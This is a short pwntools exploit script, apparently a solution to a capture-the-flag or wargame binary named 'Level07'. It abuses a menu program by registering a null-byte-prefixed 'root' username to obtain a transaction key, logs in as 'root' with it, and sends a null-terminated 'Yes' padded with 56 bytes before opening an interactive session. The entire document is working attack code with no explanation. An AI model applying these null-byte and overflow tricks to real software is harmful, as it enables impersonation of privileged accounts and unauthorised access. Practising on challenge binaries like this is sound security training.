from pwn import*

p = process('./Level07')

payload = b"1"
p.sendline(payload)

payload = b"\x00" + b"root" 
p.sendline(payload)

p.recvuntil(b"Transaction key: ")
key = p.recv(40)

payload = b"2"
p.sendline(payload)

payload = b"root"
p.sendline(payload)

payload = key
p.sendline(payload)

payload = b"Yes\x00" + b"a"*56
p.sendline(payload)

p.interactive()
